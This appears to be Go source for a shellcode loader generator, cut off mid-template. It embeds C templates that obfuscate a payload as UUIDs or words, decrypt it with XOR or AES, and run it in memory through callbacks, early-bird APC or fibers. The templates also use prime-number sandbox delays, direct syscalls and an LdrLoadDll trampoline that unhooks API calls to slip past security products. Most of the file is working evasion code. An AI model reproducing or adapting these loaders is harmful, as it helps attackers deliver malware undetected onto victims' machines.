package Loader

// 反沙箱代码
// 在主函数中调用 去判断质数
var __c__sandbox = `
	isPrime(1000000000000002493);
	isPrime(1000000000000002481);
	isPrime(1000000000000002319);
	isPrime(1000000000000002271);
	isPrime(1000000000000002217);
	isPrime(1000000000000002137);
	isPrime(1000000000000002097);
	isPrime(1000000000000002049);
	isPrime(1000000000000001953);
	isPrime(1000000000000002481);

`

// 回调函数加载
var __c__syscall_callback = `
    DWORD oldProtect;
    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__syscall__earlyBird = `
    DWORD oldProtect;
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
 	VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
	//VAVNtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
	//VAVNtTestAlert();
    testAlert();	
	
`

// 纤程加载
var __c__syscall__fiber = `
    DWORD oldProtect;
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
	isPrime(1000000000000002049);
    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	isPrime(1000000000000002049);
	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    SwitchToFiber(shellcodeFiber);
`

// uuid混淆
var __c__uuid = `
	const char* uuids[] = { %s };
	int num_uuids = sizeof(uuids) / sizeof(uuids[0]); 
    char* xpp = (char*)malloc(num_uuids * sizeof(UUID));

	if (xpp == NULL) {
		// 内存分配失败处理
		return -1;
	}
	for (int i = 0; i < num_uuids; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(xpp + i * sizeof(UUID)));
		if (status != RPC_S_OK) {
			free(xpp);
			return -1; // UUID 字符串转换失败
		}
	}
    unsigned int length = num_uuids * sizeof(UUID);

`

// english_words混淆模板
var __c__words = `
	const char* names[] = { %s };
    const char* name[] = { %s };
	unsigned char xpp[sizeof(name)];

    for (int sc_index = 0; sc_index < sizeof(xpp); sc_index++) {
        for (int tt_index = 0; tt_index < 256; tt_index++)
        {
            if (names[tt_index] == name[sc_index]) {
                xpp[sc_index] = tt_index;
                break;
            }
        }
    }
    unsigned int length = sizeof(name) / sizeof(name[0]);

`

// c xor 模板
var __c__syscall__xor = `
#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
REPLACE_STSYSCALL_Framework
#include <Rpc.h>

typedef VOID(NTAPI* myNtTestAlert)(VOID);

void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

bool isPrime(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {
	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    My_Xor((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}

`

// c aes 模板
var __c__syscall__aes = `

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <Windows.h>
#include <lmcons.h>
#include <lm.h>
#include "aes.h"
REPLACE_STSYSCALL_Framework

typedef VOID(NTAPI* myNtTestAlert)(VOID);

bool isPrime(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
int main() {

	REPLACE_ANTI_SANDBOX

	REPLACR_OBFUSCATION
    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
    struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, (uint8_t *)xpp, length);

	void* addr = NULL;
	SIZE_T allocationSize = length;

	REPLACE_Loading_Technique

    free(xpp);

    return 0;
}
`

// unhook模板
// unhook加载方式
var __c__unhook_callback = `
	char enum_calendar_info[] = {   'A', 'o', 'f', 'n', 'I', 'r', 'a', 'd', 'n', 'e', 'l', 'a', 'C', 'm', 'u', 'n', 'E', '\0' };
    reverseString(enum_calendar_info);
    typedef BOOL(WINAPI* pEnumCalendarInfo)(
            CALINFO_ENUMPROCA lpCalInfoEnumProc,
            LCID Locale,
            CALID Calendar,
            CALTYPE CalType
    );
    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);

    DWORD oldProtect;
    addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);
	MyEnumCalendarInfoA((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__unhook__earlyBird = `
	char queue_user_apc[] = { 'C', 'P', 'A', 'r', 'e', 's', 'U', 'e', 'u', 'e', 'u', 'Q', '\0'  };
    reverseString(queue_user_apc);
    typedef BOOL(WINAPI* pQueueUserAPC)(
            PAPCFUNC pfnAPC,
            HANDLE hThread,
            ULONG_PTR dwData
    );

    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
    char nt_test_alert[] = { 't', 'r', 'e', 'l', 'A', 't', 's', 'e', 'T', 't', 'N', '\0'};
    reverseString(nt_test_alert);
    typedef NTSTATUS(NTAPI* pNtTestAlert)(
            VOID
    );

    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);

    DWORD oldProtect;
	addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);
	MyQueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
    MyNtTestAlert();
`

// 纤程加载
var __c__unhook__fiber = `
	
    char convert_thread_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'd', 'a', 'e', 'r', 'h','T', 't', 'r', 'e', 'v', 'n', 'o', 'C', '\0' };
    reverseString(convert_thread_to_fiber);
    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
            LPVOID lpParameter
    );

    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);

    char create_fiber[] = { 'r', 'e', 'b', 'i', 'F', 'e', 't', 'a', 'e', 'r', 'C', '\0'};
    reverseString(create_fiber);
    typedef LPVOID(WINAPI* pCreateFiber)(
            SIZE_T dwStackSize,
            LPFIBER_START_ROUTINE lpStartAddress,
            LPVOID lpParameter
    );

    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);

    char switch_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'h', 'c', 't', 'i', 'w', 'S', '\0'};
    reverseString(switch_to_fiber);
    typedef VOID(WINAPI* pSwitchToFiber)(
            LPVOID lpFiber
    );

    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);

    DWORD oldProtect;
    PVOID mainFiber = MyConvertThreadToFiber(NULL);
    addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	isPrime(1000000000000002137);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READ, &oldProtect);
	isPrime(1000000000000002049);
    MyVirtualProtect(addr, allocationSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	isPrime(1000000000000002481);
    MyWriteProcessMemory(MyGetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = MyCreateFiber((SIZE_T) NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    MySwitchToFiber(shellcodeFiber);
`

// unhook_aes
var __c__unhook__aes = `
#include <Windows.h>
#include "aes.h"
#include <stdio.h>
#include <tlhelp32.h>


#define OBJ_CASE_INSENSITIVE 0x00000040L

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef NTSTATUS(NTAPI* pNewLdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
typedef int(WINAPI* pMessageBoxW)(
        _In_opt_ HWND hWnd,
        _In_opt_ LPCWSTR lpText,
        _In_opt_ LPCWSTR lpCaption,
        _In_ UINT uType
);
PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

SIZE_T StringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

_Bool isPrime(long long n) {
    if (n <= 1) {
        return 0;
    }

    for (long long i = 2; i * i <= n; ++i) {
        if (n %% i == 0) {
            return 0;
        }
    }

    return 1;
}

void reverseString(char* str) {
    int left = 0;
    int right = strlen(str) - 1;
    char temp;

    while (left < right) {
        // 交换两个字符
        temp = str[left];
        str[left] = str[right];
        str[right] = temp;

        // 移动指针
        left++;
        right--;
    }
}

void reverseWcharString(wchar_t* str) {
    int left = 0;
    int right = wcslen(str) - 1;

    while (left < right) {
        // 交换两个宽字符
        wchar_t temp = str[left];
        str[left] = str[right];
        str[right] = temp;

        // 移动指针
        left++;
        right--;
    }
}


int main()
{
 	pNewLdrLoadDll LdrLoadrDll;
    UNICODE_STRING user32dll;
    UNICODE_STRING kernel32dll;
    UNICODE_STRING ntdlldll;

    OBJECT_ATTRIBUTES objectAttributes_user32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };

    wchar_t user32_dll[] = { L'l', L'l', L'd', L'.', L'3', L'2', L'e', L's', L'U', L'\0' };
    wchar_t kernel32_dll[]={ L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0' }  ;
    wchar_t ntdll_dll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0' };
    reverseWcharString(user32_dll);
    reverseWcharString(kernel32_dll);
    reverseWcharString(ntdll_dll);

    char ldr_load_dll[] = { L'l', L'l', L'D', L'd', L'a', L'o', L'L', L'r', L'd', L'L', L'\0'};
    char ntdll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0'};
    char kernel32[] = { L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0'};
    reverseString(ldr_load_dll);
    reverseString(ntdll);
    reverseString(kernel32);


    //Obtaining LdrLoadDll Address from loaded NTDLL
    RtlInitUnicodeString(&user32dll, user32_dll);
    RtlInitUnicodeString(&kernel32dll, kernel32_dll);
    RtlInitUnicodeString(&ntdlldll, ntdll_dll);


    InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    char get_module_handle_a[] = { 'A', 'e', 'l', 'd', 'n', 'a', 'H', 'e', 'l', 'u', 'd', 'o', 'M', 't', 'e', 'G', '\0' };
    reverseString(get_module_handle_a);
    typedef HMODULE(WINAPI* pGetModuleHandleA1)(
            LPCSTR lpModuleName
    );

    pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
    char get_proc_address[] = { 's', 's', 'e', 'r', 'd', 'd', 'A', 'c', 'o', 'r', 'P', 't', 'e', 'G', '\0'  };
    reverseString(get_proc_address);
    typedef FARPROC(WINAPI* pGetProcAddress)(
            HMODULE hModule,
            LPCSTR lpProcName
    );
    pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
    char virtual_alloc[] = { 'c', 'o', 'l', 'l', 'A', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0' };
    reverseString(virtual_alloc);
    typedef LPVOID(WINAPI* pVirtualAlloc)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flAllocationType,
            DWORD flProtect
    );

    pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
    char virtual_protect[] = { 't', 'c', 'e', 't', 'o', 'r', 'P', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0'};
    reverseString(virtual_protect);
    typedef BOOL(WINAPI* pVirtualProtect)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flNewProtect,
            PDWORD lpflOldProtect
    );
    pVirtualProtect MyVirtualProtect1 = (pVirtualProtect)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32),(LPCSTR)virtual_protect);

    FARPROC  origLdrLoadDll = MyGetProcAddress1(GetModuleHandleA(ntdll), (LPCSTR)ldr_load_dll);
#ifdef _WIN64
    //Setting up the structure of the trampoline for the instructions
    unsigned char jumpPrelude[] = { 0x49, 0xBB };
    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
    *(void**)(jumpAddress) = jmpAddr;
    LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // mov qword ptr[rsp + 10h]  原始的LdrLoadDll中汇编，使用我们自己的防止被hook
    // mov r11,address
    // jmp rll
    // ret
    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5c\x24\x10", 5);
    //Setting up the JMP address in the original LdrLoadDll
    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);
    DWORD oldProtect1 = 0;
    MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
    LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    #else
    //  x86 架构下的代码
	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x2);

	unsigned char jumpPrelude[] = { 0xB8 };
	unsigned char jumpAddress[] = { 0x65, 0x72, 0x45, 0x77 };
	unsigned char jumpEpilogue[] = { 0xFF, 0xE0, 0xC3 };
	*(void**)(jumpAddress) = jmpAddr;

	CCopyMemory(trampoline, (PVOID)"\x89\xFF", 2);
	CCopyMemory((PBYTE)trampoline + 2, jumpPrelude, sizeof jumpPrelude);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude, jumpAddress, sizeof jumpAddress);
	CCopyMemory((PBYTE)trampoline + 2 + sizeof jumpPrelude + sizeof jumpAddress, jumpEpilogue, sizeof jumpEpilogue);
	DWORD oldProtect1 = 0;
	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
	LdrLoadrDll = (pNewLdrLoadDll)trampoline;


#endif
    ;
    //Loading dll
    HANDLE User32module = NULL;
    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
    HANDLE kernel32module = NULL;
    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
    HANDLE ntdllmodule = NULL;
    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
    typedef HMODULE(WINAPI* pGetModuleHandleA)(
            LPCSTR lpModuleName
    );
    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);

    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);

    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);


    char write_process_memory[] = { 'y', 'r', 'o', 'm', 'e', 'M', 's', 's', 'e', 'c', 'o', 'r', 'P', 'e', 't', 'i', 'r', 'W', '\0'};
    reverseString(write_process_memory);
    typedef BOOL(WINAPI* pWriteProcessMemory)(
            HANDLE hProcess,
            LPVOID lpBaseAddress,
            LPCVOID lpBuffer,
            SIZE_T nSize,
            SIZE_T* lpNumberOfBytesWritten
    );

    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
    
    char get_current_process[] = { 's', 's', 'e', 'c', 'o', 'r', 'P', 't', 'n', 'e', 'r', 'r', 'u', 'C', 't', 'e', 'G', '\0' };
    reverseString(get_current_process);
    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);

	REPLACR_OBFUSCATION

    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
	struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, (uint8_t *)xpp, length);

    SIZE_T allocationSize = length;
    void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}
`

// unhook_xor
var __c__unhook__xor = `
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


#define OBJ_CASE_INSENSITIVE 0x00000040L

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

typedef NTSTATUS(NTAPI* pNewLdrLoadDll)(PWCHAR PathToFile, ULONG Flags, PUNICODE_STRING ModuleFileName, PHANDLE ModuleHandle);
typedef int(WINAPI* pMessageBoxW)(
        _In_opt_ HWND hWnd,
        _In_opt_ LPCWSTR lpText,
        _In_opt_ LPCWSTR lpCaption,
        _In_ UINT uType
);
PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)
{
    PBYTE D = (PBYTE)Destination;
    PBYTE S = (PBYTE)Source;

    while (Length--)
        *D++ = *S++;

    return Destination;
}

SIZE_T StringLengthW(LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

VOID RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
    SIZE_T DestSize;

    if (SourceString)
    {
        DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
        DestinationString->Length = (USHORT)DestSize;
        DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
    }
    else
    {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
    }

    DestinationString->Buffer = (PWCHAR)SourceString;
}

_Bool isPrime(long long n) {
    if (n <= 1) {
        return 0;
    }

    for (long long i = 2; i * i <= n; ++i) {
        if (n %% i == 0) {
            return 0;
        }
    }

    return 1;
}

void reverseString(char* str) {
    int left = 0;
    int right = strlen(str) - 1;
    char temp;

    while (left < right) {
        // 交换两个字符
        temp = str[left];
        str[left] = str[right];
        str[right] = temp;

        // 移动指针
        left++;
        right--;
    }
}

void reverseWcharString(wchar_t* str) {
    int left = 0;
    int right = wcslen(str) - 1;

    while (left < right) {
        // 交换两个宽字符
        wchar_t temp = str[left];
        str[left] = str[right];
        str[right] = temp;

        // 移动指针
        left++;
        right--;
    }
}

void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int main()
{
    pNewLdrLoadDll LdrLoadrDll;
    UNICODE_STRING user32dll;
    UNICODE_STRING kernel32dll;
    UNICODE_STRING ntdlldll;

    OBJECT_ATTRIBUTES objectAttributes_user32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
    OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };

    wchar_t user32_dll[] = { L'l', L'l', L'd', L'.', L'3', L'2', L'e', L's', L'U', L'\0' };
    wchar_t kernel32_dll[]={ L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0' }  ;
    wchar_t ntdll_dll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0' };
    reverseWcharString(user32_dll);
    reverseWcharString(kernel32_dll);
    reverseWcharString(ntdll_dll);

    char ldr_load_dll[] = { L'l', L'l', L'D', L'd', L'a', L'o', L'L', L'r', L'd', L'L', L'\0'};
    char ntdll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0'};
    char kernel32[] = { L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0'};
    reverseString(ldr_load_dll);
    reverseString(ntdll);
    reverseString(kernel32);


    //Obtaining LdrLoadDll Address from loaded NTDLL
    RtlInitUnicodeString(&user32dll, user32_dll);
    RtlInitUnicodeString(&kernel32dll, kernel32_dll);
    RtlInitUnicodeString(&ntdlldll, ntdll_dll);


    InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
    char get_module_handle_a[] = { 'A', 'e', 'l', 'd', 'n', 'a', 'H', 'e', 'l', 'u', 'd', 'o', 'M', 't', 'e', 'G', '\0' };
    reverseString(get_module_handle_a);
    typedef HMODULE(WINAPI* pGetModuleHandleA1)(
            LPCSTR lpModuleName
    );

    pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
    char get_proc_address[] = { 's', 's', 'e', 'r', 'd', 'd', 'A', 'c', 'o', 'r', 'P', 't', 'e', 'G', '\0'  };
    reverseString(get_proc_address);
    typedef FARPROC(WINAPI* pGetProcAddress)(
            HMODULE hModule,
            LPCSTR lpProcName
    );
    pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
    char virtual_alloc[] = { 'c', 'o', 'l', 'l', 'A', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0' };
    reverseString(virtual_alloc);
    typedef LPVOID(WINAPI* pVirtualAlloc)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flAllocationType,
            DWORD flProtect
    );

    pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
    char virtual_protect[] = { 't', 'c', 'e', 't', 'o', 'r', 'P', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0'};
    reverseString(virtual_protect);
    typedef BOOL(WINAPI* pVirtualProtect)(
            LPVOID lpAddress,
            SIZE_T dwSize,
            DWORD flNewProtect,
            PDWORD lpflOldProtect
    );
    pVirtualProtect MyVirtualProtect1 = (pVirtualProtect)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32),(LPCSTR)virtual_protect);

    FARPROC  origLdrLoadDll = MyGetProcAddress1(GetModuleHandleA(ntdll), (LPCSTR)ldr_load_dll);
#ifdef _WIN64
    //Setting up the structure of the trampoline for the instructions
    unsigned char jumpPrelude[] = { 0x49, 0xBB };
    unsigned char jumpAddress[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF };
    unsigned char jumpEpilogue[] = { 0x41, 0xFF, 0xE3, 0xC3 };
    LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x5);
    *(void**)(jumpAddress) = jmpAddr;
    LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    // mov qword ptr[rsp + 10h]  原始的LdrLoadDll中汇编，使用我们自己的防止被hook
    // mov r11,address
    // jmp rll
    // ret
    CCopyMemory(trampoline, (PVOID)"\x48\x89\x5c\x24\x10", 5);
    //Setting up the JMP address in the original LdrLoadDll
    CCopyMemory((PBYTE)trampoline + 5, jumpPrelude, 2);
    CCopyMemory((PBYTE)trampoline + 5 + 2, jumpAddress, sizeof(jumpAddress));
    CCopyMemory((PBYTE)trampoline + 5 + 2 + 8, jumpEpilogue, 4);
    DWORD oldProtect1 = 0;
    MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
    LdrLoadrDll = (pNewLdrLoadDll)trampoline;

    #else
    //  x86 架构下的代码
	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

	LPVOID jmpAddr = (void*)((char*)origLdrLoadDll + 0x2);

	unsigned char jumpPrelude[] = { 0xB8 };
